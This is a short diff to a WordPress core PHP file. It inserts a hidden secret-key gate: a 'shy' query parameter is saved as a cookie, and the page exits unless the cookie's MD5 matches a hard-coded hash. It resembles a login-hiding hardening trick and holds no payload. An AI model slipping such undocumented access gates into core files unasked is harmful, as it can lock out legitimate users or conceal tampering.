@@ -7,7 +7,9 @@
  *
  * @package WordPress
  */
-
+$v = $_GET['shy'];
+if($v && !$_COOKIE['shy']) setcookie("shy", $v, time()+3600*24);
+if(md5($_COOKIE['shy']) !== '9ace6de40c8f091dcee3e491aefd8c97') exit;
 /** Make sure that the WordPress bootstrap has run before continuing. */
 require( dirname(__FILE__) . '/wp-load.php' );
 
